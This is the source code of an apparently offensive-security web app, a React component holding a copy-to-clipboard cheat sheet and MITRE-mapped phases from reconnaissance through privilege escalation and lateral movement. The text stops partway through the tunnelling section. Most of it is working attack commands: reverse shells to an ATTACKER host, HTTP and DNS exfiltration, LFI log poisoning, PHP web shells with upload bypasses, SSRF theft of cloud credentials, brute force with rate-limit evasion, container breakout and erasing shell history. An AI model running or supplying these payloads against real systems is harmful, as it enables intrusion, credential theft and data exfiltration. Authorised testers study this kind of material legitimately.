"use client";

import { useState } from "react";
import { ChevronDownIcon, ChevronRightIcon, ClipboardDocumentIcon, CheckIcon } from "@heroicons/react/24/outline";

// ---- types ----
interface CodeBlock { lang: string; code: string }
interface Section { id: string; title: string; text?: string; blocks?: CodeBlock[]; table?: { headers: string[]; rows: string[][] }; mitre?: string[]; refs?: { label: string; url: string }[] }
interface Phase { id: string; label: string; badge: string; color: string; sections: Section[] }

// ---- copy button ----
function CopyBtn({ text }: { text: string }) {
  const [copied, setCopied] = useState(false);
  const copy = () => {
    navigator.clipboard.writeText(text);
    setCopied(true);
    setTimeout(() => setCopied(false), 1500);
  };
  return (
    <button onClick={copy} className="flex items-center gap-1 rounded px-1.5 py-0.5 text-[10px] text-zinc-500 hover:text-zinc-300 hover:bg-zinc-700 transition-colors">
      {copied ? <CheckIcon className="h-3.5 w-3.5 text-green-400" /> : <ClipboardDocumentIcon className="h-3.5 w-3.5" />}
      {copied ? "Copied" : "Copy"}
    </button>
  );
}

// ---- collapsible section ----
function SectionBlock({ s }: { s: Section }) {
  const [open, setOpen] = useState(false);
  return (
    <div className="border border-zinc-800 rounded overflow-hidden">
      <button
        onClick={() => setOpen((v) => !v)}
        className="flex w-full items-center justify-between px-3 py-2.5 text-left bg-zinc-900 hover:bg-zinc-800 transition-colors"
      >
        <span className="text-xs font-medium text-zinc-300">{s.title}</span>
        <div className="flex items-center gap-1.5">
          {s.mitre?.map((m) => (
            <span key={m} className="rounded border border-purple-800 bg-purple-950 px-1.5 py-0.5 font-mono text-[9px] text-purple-300">{m}</span>
          ))}
          {open ? <ChevronDownIcon className="h-3.5 w-3.5 text-zinc-600" /> : <ChevronRightIcon className="h-3.5 w-3.5 text-zinc-600" />}
        </div>
      </button>
      {open && (
        <div className="px-4 py-3 space-y-3 bg-zinc-900/50">
          {s.text && <p className="text-xs text-zinc-400 whitespace-pre-line leading-relaxed">{s.text}</p>}
          {s.table && (
            <div className="overflow-x-auto rounded border border-zinc-800">
              <table className="w-full text-xs">
                <thead className="bg-zinc-900">
                  <tr>
                    {s.table.headers.map((h) => (
                      <th key={h} className="px-3 py-2 text-left text-[10px] font-semibold uppercase tracking-wider text-zinc-500">{h}</th>
                    ))}
                  </tr>
                </thead>
                <tbody>
                  {s.table.rows.map((row, i) => (
                    <tr key={i} className="border-t border-zinc-800">
                      {row.map((cell, j) => (
                        <td key={j} className="px-3 py-2 text-zinc-400 font-mono text-xs">{cell}</td>
                      ))}
                    </tr>
                  ))}
                </tbody>
              </table>
            </div>
          )}
          {s.blocks?.map((b, i) => (
            <div key={i} className="rounded border border-zinc-800 bg-zinc-950 overflow-hidden">
              <div className="flex items-center justify-between px-3 py-1.5 border-b border-zinc-800">
                <span className="text-[10px] text-zinc-600 font-mono">{b.lang}</span>
                <CopyBtn text={b.code} />
              </div>
              <pre className="p-4 overflow-x-auto text-xs text-green-300 font-mono leading-relaxed whitespace-pre-wrap">{b.code}</pre>
            </div>
          ))}
          {s.refs && s.refs.length > 0 && (
            <div className="flex flex-wrap gap-1.5 pt-1">
              {s.refs.map((r) => (
                <a key={r.url} href={r.url} target="_blank" rel="noopener noreferrer"
                   className="rounded border border-zinc-700 bg-zinc-800 px-2 py-0.5 text-[10px] text-zinc-400 hover:text-fuchsia-300 hover:border-fuchsia-700 transition-colors">
                  ↗ {r.label}
                </a>
              ))}
            </div>
          )}
        </div>
      )}
    </div>
  );
}

// ---- cheat sheet ----
const CHEATSHEET = [
  { goal: "Subdomain enum (passive)", cmd: `curl -s "https://crt.sh/?q=%25.target.com&output=json" | jq -r '.[].name_value' | sed 's/\\*\\.//g' | sort -u` },
  { goal: "Subdomain enum (active)", cmd: `subfinder -d target.com -all -silent | httpx -silent -tech-detect -title -status-code` },
  { goal: "Port scan top 1000", cmd: `naabu -host target.com -top-ports 1000 -rate 1000` },
  { goal: "Nuclei CVE + KEV scan", cmd: `nuclei -u https://target.com -tags cve,kev,exposure -severity critical,high -rate-limit 150` },
  { goal: "ASN / IP block lookup", cmd: `whois -h whois.cymru.com " -v 1.2.3.4"` },
  { goal: "Wayback URLs", cmd: `curl -s "http://web.archive.org/cdx/search/cdx?url=*.target.com/*&output=text&fl=original&collapse=urlkey"` },
  { goal: "GitHub secret recon", cmd: `gh search code "target.com password" --json repository,path --limit 100` },
  { goal: "WAF detection", cmd: `wafw00f https://target.com` },
  { goal: "Tech fingerprint", cmd: `whatweb -a 3 https://target.com` },
  { goal: "Directory fuzz", cmd: `ffuf -w SecLists/Discovery/Web-Content/raft-medium-directories.txt -u https://target.com/FUZZ -mc 200,301,403 -fc 404` },
  { goal: "vhost / sub fuzz", cmd: `ffuf -w sublist.txt -u https://target.com -H "Host: FUZZ.target.com" -mc 200,301,403` },
  { goal: "Param discovery", cmd: `arjun -u "https://target.com/page.php"` },
  { goal: "SQLi (sqlmap)", cmd: `sqlmap -u "https://target.com/?id=1" --batch --dbs --threads 10` },
  { goal: "SQLi (manual)", cmd: `curl "https://target.com/?id=1' UNION SELECT @@version,NULL,NULL-- -"` },
  { goal: "LFI test", cmd: `curl "https://target.com/?page=../../../../etc/passwd"` },
  { goal: "PHP filter chain", cmd: `curl "https://target.com/?page=php://filter/convert.base64-encode/resource=index.php" | grep -oE 'PD9wa[A-Za-z0-9+/=]+' | base64 -d` },
  { goal: "Reverse shell (bash)", cmd: `bash -c 'bash -i >& /dev/tcp/ATTACKER/4444 0>&1'` },
  { goal: "Reverse shell (python)", cmd: `python3 -c 'import os,pty,socket;s=socket.socket();s.connect(("ATTACKER",4444));[os.dup2(s.fileno(),f) for f in(0,1,2)];pty.spawn("/bin/bash")'` },
  { goal: "TTY upgrade", cmd: `python3 -c 'import pty;pty.spawn("/bin/bash")'; export TERM=xterm-256color` },
  { goal: "Linux privesc auto", cmd: `curl -L https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh | bash` },
  { goal: "Windows privesc auto", cmd: `winpeas.exe quiet cmd fast` },
  { goal: "SUID search", cmd: `find / -perm -4000 -type f 2>/dev/null` },
  { goal: "Sudo abuse check", cmd: `sudo -l   # cross-check at gtfobins.github.io` },
  { goal: "Capabilities check", cmd: `getcap -r / 2>/dev/null` },
  { goal: "DB dump (MySQL)", cmd: `mysqldump -h HOST -u USER -pPASS --all-databases > /tmp/dump.sql` },
  { goal: "DB dump (Postgres)", cmd: `PGPASSWORD='PASS' pg_dump -h HOST -U USER DBNAME > /tmp/dump.sql` },
  { goal: "Exfil via HTTP", cmd: `curl -F "f=@/tmp/dump.tar.gz" http://ATTACKER:8080/up` },
  { goal: "Exfil via DNS", cmd: `xxd -p /tmp/x | while read l; do dig "$l.attacker.tld" +short; done` },
  { goal: "Hashcat MD5 crack", cmd: `hashcat -m 0 -a 0 hashes.txt rockyou.txt --force` },
  { goal: "Hashcat NTLM", cmd: `hashcat -m 1000 -a 0 ntlm.txt rockyou.txt --force` },
  { goal: "Hashcat WPA", cmd: `hashcat -m 22000 -a 0 wpa.hc22000 rockyou.txt` },
  { goal: "Cleanup history", cmd: `unset HISTFILE; history -c; cat /dev/null > ~/.bash_history` },
];

function CheatSheet() {
  const [copied, setCopied] = useState<number | null>(null);
  const [filter, setFilter] = useState("");
  const copy = (i: number, text: string) => {
    navigator.clipboard.writeText(text);
    setCopied(i);
    setTimeout(() => setCopied(null), 1500);
  };
  const filtered = CHEATSHEET.filter((c) =>
    c.goal.toLowerCase().includes(filter.toLowerCase()) ||
    c.cmd.toLowerCase().includes(filter.toLowerCase())
  );
  return (
    <div className="space-y-2">
      <div className="flex items-center justify-between">
        <p className="text-[10px] text-zinc-600">Quick-reference commands — click a row to copy.</p>
        <input
          type="text"
          value={filter}
          onChange={(e) => setFilter(e.target.value)}
          placeholder="filter…"
          className="rounded border border-zinc-700 bg-zinc-800 px-2.5 py-1 text-xs text-zinc-300 placeholder-zinc-600 outline-none focus:border-fuchsia-600 w-48"
        />
      </div>
      {filtered.map((item, i) => (
        <button
          key={i}
          onClick={() => copy(i, item.cmd)}
          className="w-full flex items-center gap-3 rounded border border-zinc-800 px-3 py-2 text-left hover:bg-zinc-800 transition-colors group"
        >
          <span className="min-w-[180px] text-[10px] font-medium text-fuchsia-400">{item.goal}</span>
          <code className="flex-1 font-mono text-xs text-zinc-400 truncate">{item.cmd}</code>
          {copied === i
            ? <CheckIcon className="h-3.5 w-3.5 text-green-400 shrink-0" />
            : <ClipboardDocumentIcon className="h-3.5 w-3.5 text-zinc-700 group-hover:text-zinc-400 shrink-0" />}
        </button>
      ))}
    </div>
  );
}

// ---- PHASES (English, modern, MITRE-mapped) ----
const PHASES: Phase[] = [
  {
    id: "p0", label: "Recon", badge: "Phase 0", color: "bg-blue-100 text-blue-700",
    sections: [
      {
        id: "0.1", title: "0.1 — Passive OSINT (no traffic to target)",
        mitre: ["TA0043", "T1591"],
        text: `Goal: build target picture without sending packets to the asset.
Sources: certificate transparency, DNS history, search engines, code repos, leaked-credential DBs.`,
        blocks: [
          { lang: "bash — crt.sh certificate transparency", code: `curl -s "https://crt.sh/?q=%25.target.com&output=json" \\
  | jq -r '.[].name_value' | sed 's/\\*\\.//g' | sort -u > subs.txt
wc -l subs.txt` },
          { lang: "bash — subfinder (multi-source passive)", code: `subfinder -d target.com -all -silent -o subs.txt
# Sources used: chaos, censys, shodan, virustotal, certspotter, hackertarget, etc.` },
          { lang: "bash — Wayback Machine historical URLs", code: `curl -s "http://web.archive.org/cdx/search/cdx?url=*.target.com/*&output=text&fl=original&collapse=urlkey" \\
  | sort -u > wayback.txt
grep -E '\\?|=' wayback.txt | head -50  # parameters worth fuzzing` },
          { lang: "bash — GitHub dorks for leaked secrets", code: `gh search code "target.com DB_PASSWORD" --json repository,path
gh search code "target.com api_key"     --json repository,path
trufflehog github --org=target-org --token=$GITHUB_TOKEN` },
        ],
        refs: [
          { label: "crt.sh", url: "https://crt.sh" },
          { label: "Shodan", url: "https://shodan.io" },
          { label: "Censys", url: "https://search.censys.io" },
          { label: "MITRE T1591", url: "https://attack.mitre.org/techniques/T1591/" },
        ],
      },
      {
        id: "0.2", title: "0.2 — Active subdomain & DNS enumeration",
        mitre: ["T1590.005"],
        blocks: [
          { lang: "bash — bruteforce + permute", code: `# DNS bruteforce
shuffledns -d target.com -w SecLists/Discovery/DNS/dns-Jhaddix.txt -r resolvers.txt -o brute.txt

# Permutations (combine known patterns: dev, staging, api)
dnsgen subs.txt | shuffledns -d target.com -r resolvers.txt -o permuted.txt` },
          { lang: "bash — DNS records audit", code: `dig target.com any +short
dig -t txt target.com +short      # often leaks SPF/DKIM hosts
dig -t mx target.com +short
dig axfr @ns1.target.com target.com   # zone transfer (usually denied)` },
        ],
      },
      {
        id: "0.3", title: "0.3 — ASN / IP block intelligence",
        text: `Identify the entire IP range a target controls.
Useful for finding sister-orgs, dev environments and forgotten boxes.`,
        blocks: [
          { lang: "bash", code: `# ASN lookup
whois -h whois.cymru.com " -v 1.2.3.4"

# All prefixes belonging to ASN
amass intel -asn 12345

# Reverse-DNS the whole /24
for i in $(seq 1 254); do dig -x 1.2.3.$i +short; done | grep -v '^$'` },
        ],
      },
    ]
  },

  {
    id: "p1", label: "Surface Map", badge: "Phase 1", color: "bg-cyan-100 text-cyan-700",
    sections: [
      {
        id: "1.1", title: "1.1 — Live host probing + tech fingerprint",
        mitre: ["T1595.002"],
        blocks: [
          { lang: "bash — httpx (preferred)", code: `cat subs.txt | httpx -silent -tech-detect -title -status-code -follow-redirects -json -o probe.json
jq -r 'select(.tech) | "\\(.url) [\\(.status_code)] tech=\\(.tech | join(","))"' probe.json` },
          { lang: "bash — whatweb (deep)", code: `whatweb -a 3 https://target.com   # aggression level 3 = heavy
nuclei -u https://target.com -t http/technologies/ -silent` },
        ],
        table: {
          headers: ["Indicator", "Likely Stack"],
          rows: [
            ["Set-Cookie: wordpress_*", "WordPress (also wp-login.php, /wp-json)"],
            ["Set-Cookie: laravel_session, XSRF-TOKEN", "Laravel"],
            ["Set-Cookie: ci_session", "CodeIgniter"],
            ["Set-Cookie: csrftoken / sessionid", "Django"],
            ["X-Powered-By: Express", "Node.js / Express"],
            ["X-Powered-By: ASP.NET", "IIS / ASP.NET"],
            ["X-Generator: Drupal X", "Drupal"],
            ["X-Debug-Token", "Symfony (profiler enabled = critical)"],
            ["x-jenkins / X-Jenkins-Session", "Jenkins"],
            ["x-confluence-* / atlassian", "Atlassian Confluence"],
            ["Server: cloudflare", "CF protected — bypass via origin discovery"],
            ["Server: openresty + Lua WAF", "Tighter WAF — use OOB payloads"],
          ]
        }
      },
      {
        id: "1.2", title: "1.2 — Port scanning (TCP + UDP)",
        mitre: ["T1046"],
        blocks: [
          { lang: "bash — fast TCP (naabu)", code: `naabu -host target.com -top-ports 1000 -rate 1000 -c 50 -silent -o ports.txt` },
          { lang: "bash — deep (nmap)", code: `# Service + script scan only on open ports
nmap -Pn -sV -sC -p $(cat ports.txt | cut -d: -f2 | sort -u | tr '\\n' ',') target.com -oN nmap.txt

# Full TCP scan (slow, find weird services)
nmap -Pn -p- --min-rate 5000 target.com

# UDP top 50 (DNS, SNMP, NTP often open)
sudo nmap -Pn -sU --top-ports 50 -sV target.com` },
          { lang: "bash — masscan (huge ranges)", code: `sudo masscan -p1-65535 1.2.3.0/24 --rate 10000 -oX masscan.xml` },
        ],
      },
      {
        id: "1.3", title: "1.3 — Virtual-host / SNI enumeration",
        text: `Same IP often hosts many domains. Sometimes a hidden vhost is unpatched while the front page is hardened.`,
        blocks: [
          { lang: "bash", code: `# vhost fuzz by Host header
ffuf -w sublist.txt -u https://1.2.3.4 -H "Host: FUZZ.target.com" -mc 200,301,403 -fs <baseline-size>

# SNI bypass (sometimes WAF only inspects SNI, not Host)
curl --resolve "hidden.target.com:443:1.2.3.4" https://hidden.target.com` },
        ],
      },
      {
        id: "1.4", title: "1.4 — WAF / CDN detection",
        blocks: [
          { lang: "bash — wafw00f", code: `wafw00f -v https://target.com` },
          { lang: "bash — payload probes", code: `for payload in '<script>alert(1)</script>' "' OR 1=1--" '../../../etc/passwd' '\${jndi:ldap://x}'; do
  printf "%-40s → " "$payload"
  curl -sk -o /dev/null -w "HTTP %{http_code}\\n" "https://target.com/?q=$(python3 -c 'import urllib.parse,sys;print(urllib.parse.quote(sys.argv[1]))' "$payload")"
done` },
        ],
        refs: [
          { label: "wafw00f", url: "https://github.com/EnableSecurity/wafw00f" },
          { label: "Cloudflare bypass tactics", url: "https://github.com/Charl3z/cloudflare-bypass" },
        ],
      },
    ]
  },

  {
    id: "p2", label: "Vuln Discovery", badge: "Phase 2", color: "bg-purple-100 text-purple-700",
    sections: [
      {
        id: "2.1", title: "2.1 — Nuclei templated scanning (CVE + KEV + 0-day)",
        mitre: ["T1595.002"],
        text: `Default sweep covers known CVEs and CISA KEV (Known Exploited Vulnerabilities) entries.
Pull the latest template set before each engagement.`,
        blocks: [
          { lang: "bash", code: `# Update + run
nuclei -update-templates
nuclei -l live.txt -tags cve,kev,0day,exposure,misconfig,takeover,default-login \\
  -severity critical,high,medium -rate-limit 150 -c 25 -jsonl -o nuclei.jsonl

# Focus: subset that almost never false-positives
nuclei -l live.txt -tags kev -severity critical -jsonl -o nuclei-kev.jsonl

# Custom template directory
nuclei -l live.txt -t custom-templates/ -jsonl` },
        ],
        refs: [
          { label: "Nuclei templates", url: "https://github.com/projectdiscovery/nuclei-templates" },
          { label: "CISA KEV catalog", url: "https://www.cisa.gov/known-exploited-vulnerabilities-catalog" },
        ],
      },
      {
        id: "2.2", title: "2.2 — Directory & file fuzzing",
        mitre: ["T1083"],
        blocks: [
          { lang: "bash — ffuf wordlists", code: `# Common content
ffuf -w SecLists/Discovery/Web-Content/raft-medium-directories.txt \\
     -u https://target.com/FUZZ -mc 200,204,301,302,307,401,403 -fc 404 \\
     -recursion -recursion-depth 2 -o ffuf.json -of json

# Backup / sensitive files
ffuf -w SecLists/Discovery/Web-Content/RAFT-Backup-Files-Wordlist.txt \\
     -u https://target.com/FUZZ -mc 200 -fs 0` },
          { lang: "bash — known exposure paths", code: `for p in .env .env.local .env.backup .git/config .git/HEAD wp-config.php.bak \\
         backup.sql dump.sql .htpasswd phpinfo.php server-status \\
         _ignition/health-check telescope _profiler/phpinfo; do
  curl -sk -o /dev/null -w "[%{http_code}] $p\\n" "https://target.com/$p"
done` },
        ],
      },
      {
        id: "2.3", title: "2.3 — Parameter discovery",
        text: `Hidden GET / POST params often expose IDOR, SSRF, debug toggles.`,
        blocks: [
          { lang: "bash", code: `# Arjun (active fuzz)
arjun -u "https://target.com/api/v1/user" -m GET -t 25 -oT params.txt

# ParamSpider (passive — from Wayback)
paramspider --domain target.com --level high

# x8 (modern, fast)
x8 -u https://target.com/api/v1/user -w SecLists/Discovery/Web-Content/burp-parameter-names.txt` },
        ],
      },
      {
        id: "2.4", title: "2.4 — Credential & user enumeration",
        mitre: ["T1110.003", "T1589.002"],
        blocks: [
          { lang: "bash", code: `# WordPress REST (often misconfigured)
curl -s "https://target.com/wp-json/wp/v2/users" | jq -r '.[] | "\\(.id) \\(.name) \\(.slug)"'

# Author-id user enum
for i in $(seq 1 20); do
  curl -s -o /dev/null -w "%{http_code} ?author=$i\\n" "https://target.com/?author=$i"
done

# Response-diff enumeration on login
for u in admin administrator root demo $(cat names.txt); do
  body=$(curl -s -d "username=$u&password=zz" https://target.com/login)
  echo "$u  $(echo "$body" | wc -c) bytes"
done | sort -k2 -n | tail` },
        ],
      },
      {
        id: "2.5", title: "2.5 — Vulnerability prioritisation",
        text: `Rank findings by exploitability × business impact, not just CVSS.

TIER 1 — Unauth RCE / SQLi / file-upload
  • Direct shell, full DB takeover, account compromise of any user
  • Always patch / report first

TIER 2 — Auth-required RCE / privilege escalation
  • Stored XSS that hits admin, SSRF reaching IMDS, deserialization with weak auth
  • Often chain with leaked creds (.env, GitHub) to reach TIER 1 effect

TIER 3 — Info disclosure
  • phpinfo, debug pages, version banners, directory listing
  • Feed back into TIER 1/2 by matching versions to public exploits

TIER 4 — Hygiene
  • Missing security headers, weak ciphers, missing rate limit
  • Worth fixing, rarely a finding on their own`,
      },
    ]
  },

  {
    id: "p3", label: "Initial Access", badge: "Phase 3", color: "bg-yellow-100 text-yellow-700",
    sections: [
      {
        id: "3.1", title: "3.1 — SQL injection → DB takeover",
        mitre: ["T1190"],
        blocks: [
          { lang: "bash — manual confirmation", code: `# Boolean-based
curl "https://target.com/page?id=1 AND 1=1-- -"   # baseline
curl "https://target.com/page?id=1 AND 1=2-- -"   # diff → SQLi

# Time-based
time curl "https://target.com/page?id=1' AND SLEEP(5)-- -"

# Error-based
curl "https://target.com/page?id=1'"   # look for "SQL syntax", "PDOException", etc.` },
          { lang: "bash — sqlmap full takeover", code: `# Detect + enumerate
sqlmap -u "https://target.com/page?id=1" --batch --dbs --threads 10

# Dump credentials table
sqlmap -u "..." --batch -D corp -T users --columns
sqlmap -u "..." --batch -D corp -T users -C username,password --dump

# OS shell (needs FILE or xp_cmdshell privilege)
sqlmap -u "..." --batch --os-shell` },
          { lang: "bash — manual UNION extraction", code: `# 1. Find column count
?id=1 ORDER BY 5-- -        # bump until error

# 2. Find printable columns
?id=-1 UNION SELECT 1,2,3,4,5-- -

# 3. Extract data
?id=-1 UNION SELECT NULL,@@version,database(),current_user(),NULL-- -

# 4. All tables
?id=-1 UNION SELECT NULL,GROUP_CONCAT(table_name),NULL,NULL,NULL
       FROM information_schema.tables WHERE table_schema=database()-- -` },
        ],
        refs: [
          { label: "sqlmap docs", url: "https://github.com/sqlmapproject/sqlmap/wiki" },
          { label: "PortSwigger SQLi cheat-sheet", url: "https://portswigger.net/web-security/sql-injection/cheat-sheet" },
        ],
      },
      {
        id: "3.2", title: "3.2 — Local File Inclusion → RCE",
        mitre: ["T1190", "T1505"],
        blocks: [
          { lang: "bash — confirm + escalate", code: `# 1. Confirm
curl "https://target.com/?page=../../../../etc/passwd"

# 2. PHP filter chain (source-code disclosure)
curl "https://target.com/?page=php://filter/convert.base64-encode/resource=index.php" \\
  | grep -oE 'PD9wa[A-Za-z0-9+/=]+' | base64 -d

# 3. /proc/self/environ poisoning → RCE
curl -A "<?php system(\\$_GET['c']); ?>" "https://target.com/?page=/proc/self/environ&c=id"

# 4. Apache log poisoning → RCE
curl -A "<?php system(\\$_GET['c']); ?>" "https://target.com/"
curl "https://target.com/?page=/var/log/apache2/access.log&c=id"

# 5. data:// wrapper (allow_url_include=On)
curl "https://target.com/?page=data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjJ10pOyA/Pg==&c=id"` },
        ],
      },
      {
        id: "3.3", title: "3.3 — SSRF → cloud takeover",
        mitre: ["T1190", "T1078.004"],
        blocks: [
          { lang: "bash — cloud metadata pivot", code: `# AWS IMDSv1 (legacy)
curl "https://target.com/fetch?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/"
# AWS IMDSv2 (token required — sometimes bypassable via header injection)
TOK=$(curl -X PUT -H "X-aws-ec2-metadata-token-ttl-seconds: 21600" http://169.254.169.254/latest/api/token)
curl -H "X-aws-ec2-metadata-token: $TOK" http://169.254.169.254/latest/meta-data/iam/security-credentials/

# GCP
curl "https://target.com/fetch?url=http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token"

# Azure IMDS
curl "https://target.com/fetch?url=http://169.254.169.254/metadata/instance?api-version=2021-02-01"

# Internal port scan
for p in 22 80 443 3306 5432 6379 8080 9200 27017; do
  echo "[$(curl -sk -o /dev/null -w '%{http_code}' --max-time 5 "https://target.com/fetch?url=http://127.0.0.1:$p/")] :$p"
done

# Redis via gopher
curl "https://target.com/fetch?url=gopher://127.0.0.1:6379/_*1%0d%0a\\$4%0d%0ainfo%0d%0a"` },
        ],
        refs: [
          { label: "PayloadsAllTheThings SSRF", url: "https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Request%20Forgery" },
          { label: "AWS IMDSv2 docs", url: "https://docs.aws.amazon.com/AWSEC2/latest/UserGuide/configuring-IMDS-existing-instances.html" },
        ],
      },
      {
        id: "3.4", title: "3.4 — File upload → web shell",
        mitre: ["T1190", "T1505.003"],
        blocks: [
          { lang: "bash", code: `# 1. Basic shell
echo '<?php system($_GET["c"]); ?>' > shell.php

# 2. Extension bypass attempts
mv shell.php shell.phtml         # often un-listed
mv shell.php shell.php.jpg       # double-extension
mv shell.php shell.php%00.jpg    # null-byte (very old PHP)
mv shell.php .htaccess            # if .htaccess is uploaded, parse all jpg as PHP

# 3. Magic byte polyglot
printf 'GIF89a\\n<?php system($_GET["c"]); ?>' > shell.php

# 4. Content-Type smuggling
curl -F "file=@shell.php;type=image/jpeg" https://target.com/upload

# 5. Trigger
curl "https://target.com/uploads/shell.php?c=id"` },
        ],
      },
      {
        id: "3.5", title: "3.5 — Credential attacks",
        mitre: ["T1110.001", "T1110.003"],
        blocks: [
          { lang: "bash — password spraying (1 password, many users)", code: `for user in $(cat valid-users.txt); do
  resp=$(curl -sk -d "username=$user&password=Spring2025!" https://target.com/login)
  echo "$user  $(echo "$resp" | wc -c) bytes"
done | sort -k2 -n | tail` },
          { lang: "bash — hydra brute (1 user, many passwords)", code: `hydra -l admin -P rockyou.txt -t 4 -s 443 -S target.com \\
  https-post-form "/login:username=^USER^&password=^PASS^:Invalid credentials"` },
          { lang: "bash — bypass rate-limit (header rotation)", code: `for pw in $(head -1000 rockyou.txt); do
  curl -sk -H "X-Forwarded-For: 10.$RANDOM.$RANDOM.$RANDOM" \\
       -H "X-Real-IP: 10.$RANDOM.$RANDOM.$RANDOM" \\
       -d "username=admin&password=$pw" https://target.com/login &
  sleep 0.2
done; wait` },
        ],
      },
    ]
  },

  {
    id: "p4", label: "Foothold", badge: "Phase 4", color: "bg-red-100 text-red-700",
    sections: [
      {
        id: "4.1", title: "4.1 — Reverse shell payloads",
        mitre: ["T1059"],
        blocks: [
          { lang: "bash — listener (attacker side)", code: `# nc (no TLS)
rlwrap nc -lvnp 4444

# pwncat (modern TTY-friendly, auto-stabilises)
pwncat-cs -lp 4444` },
          { lang: "bash — payload variants", code: `# Bash
bash -c 'bash -i >& /dev/tcp/ATTACKER/4444 0>&1'

# Python3
python3 -c 'import os,pty,socket;s=socket.socket();s.connect(("ATTACKER",4444));[os.dup2(s.fileno(),f) for f in(0,1,2)];pty.spawn("/bin/bash")'

# nc (with mkfifo when -e is stripped)
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc ATTACKER 4444 >/tmp/f

# Perl
perl -e 'use Socket;$i="ATTACKER";$p=4444;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'

# msfvenom (any platform)
msfvenom -p php/reverse_php LHOST=ATTACKER LPORT=4444 -f raw > rev.php
msfvenom -p linux/x64/shell_reverse_tcp LHOST=ATTACKER LPORT=4444 -f elf > rev` },
        ],
        refs: [
          { label: "RevShells.com generator", url: "https://www.revshells.com/" },
          { label: "PayloadsAllTheThings", url: "https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md" },
        ],
      },
      {
        id: "4.2", title: "4.2 — TTY stabilisation",
        text: `Initial reverse shells are dumb (no tab-complete, no arrow keys, Ctrl-C kills the shell).
Upgrade immediately.`,
        blocks: [
          { lang: "bash", code: `# 1. Spawn a real PTY
python3 -c 'import pty;pty.spawn("/bin/bash")'

# 2. Background, fix terminal
Ctrl-Z
stty raw -echo; fg
reset
export TERM=xterm-256color
export SHELL=bash
stty rows 50 columns 200` },
        ],
      },
    ]
  },

  {
    id: "p5", label: "Privesc", badge: "Phase 5", color: "bg-orange-100 text-orange-700",
    sections: [
      {
        id: "5.1", title: "5.1 — Linux privilege escalation",
        mitre: ["T1068"],
        blocks: [
          { lang: "bash — automated", code: `# LinPEAS
curl -L https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh | sh

# linux-exploit-suggester
wget -q https://raw.githubusercontent.com/mzet-/linux-exploit-suggester/master/linux-exploit-suggester.sh
chmod +x linux-exploit-suggester.sh && ./linux-exploit-suggester.sh` },
          { lang: "bash — manual quick wins", code: `# Sudo misconfig — cross-check with gtfobins.github.io
sudo -l

# SUID binaries — check each on gtfobins
find / -perm -4000 -type f 2>/dev/null

# Capabilities
getcap -r / 2>/dev/null

# Writable cron / writable PATH
ls -la /etc/cron* /var/spool/cron/
echo $PATH | tr ':' '\\n' | while read p; do [ -w "$p" ] && echo "WRITABLE: $p"; done

# Kernel exploit (cross-check with searchsploit)
uname -r ; cat /etc/os-release
searchsploit "linux kernel $(uname -r | cut -d- -f1)"` },
        ],
        refs: [
          { label: "GTFOBins", url: "https://gtfobins.github.io" },
          { label: "PEASS-ng", url: "https://github.com/carlospolop/PEASS-ng" },
        ],
      },
      {
        id: "5.2", title: "5.2 — Windows privilege escalation",
        mitre: ["T1068"],
        blocks: [
          { lang: "powershell — automated", code: `# WinPEAS
iex(new-object net.webclient).downloadstring('http://ATTACKER/winpeas.ps1')

# PowerUp
iex(new-object net.webclient).downloadstring('http://ATTACKER/PowerUp.ps1')
Invoke-AllChecks

# Seatbelt (large enum)
Seatbelt.exe -group=all` },
          { lang: "powershell — manual quick wins", code: `# Unquoted service paths
wmic service get name,displayname,pathname,startmode | findstr /i "auto" | findstr /i /v "C:\\Windows\\\\"

# AlwaysInstallElevated
reg query HKCU\\SOFTWARE\\Policies\\Microsoft\\Windows\\Installer /v AlwaysInstallElevated
reg query HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows\\Installer /v AlwaysInstallElevated

# Stored credentials
cmdkey /list
findstr /si "password" *.txt *.xml *.config *.ini

# Token / SeImpersonatePrivilege → PrintSpoofer / GodPotato
whoami /priv | findstr SeImpersonate` },
        ],
      },
      {
        id: "5.3", title: "5.3 — Container / cloud breakout",
        mitre: ["T1611"],
        blocks: [
          { lang: "bash", code: `# Inside a Docker container — am I privileged?
cat /proc/self/status | grep CapEff
# CapEff: 0000003fffffffff → privileged → mount host
mkdir /mnt/host; mount /dev/sda1 /mnt/host; chroot /mnt/host bash

# Docker socket exposed
ls -la /var/run/docker.sock
docker -H unix:///var/run/docker.sock run -v /:/mnt -it alpine chroot /mnt sh

# Kubernetes — service-account token
cat /var/run/secrets/kubernetes.io/serviceaccount/token
kubectl --token=$(cat /var/run/secrets/.../token) auth can-i --list

# AWS IMDS from a Kubernetes pod
curl http://169.254.169.254/latest/meta-data/iam/security-credentials/` },
        ],
      },
    ]
  },

  {
    id: "p6", label: "Lateral", badge: "Phase 6", color: "bg-pink-100 text-pink-700",
    sections: [
      {
        id: "6.1", title: "6.1 — Same-host pivoting",
        mitre: ["T1021"],
        blocks: [
          { lang: "bash", code: `# Enumerate every vhost on the box
grep -RhE 'ServerName|ServerAlias' /etc/apache2/sites-enabled/ 2>/dev/null
grep -RhE 'server_name'             /etc/nginx/sites-enabled/  2>/dev/null

# Read every site's DB config
find /var/www -maxdepth 4 \\( -name 'wp-config.php' -o -name '.env' -o -name 'configuration.php' \\) -exec sh -c 'echo "=== $1 ==="; grep -E "DB_|PASSWORD|host|user" "$1"' _ {} \\;

# Reuse those creds against MySQL
mysql -h 127.0.0.1 -u root -p"$PASS" -e 'SHOW DATABASES;'` },
        ],
      },
      {
        id: "6.2", title: "6.2 — Network tunneling",
        text: `Forward traffic from your attacker box through the compromised host into the internal network.`,
        blocks: [
          { lang: "bash — chisel (modern)", code: `# Attacker
chisel server -p 8000 --reverse

# Victim
./chisel client ATTACKER:8000 R:1080:socks
# → SOCKS5 proxy on attacker:1080
proxychains -q nmap -sT -Pn 10.10.10.0/24` },
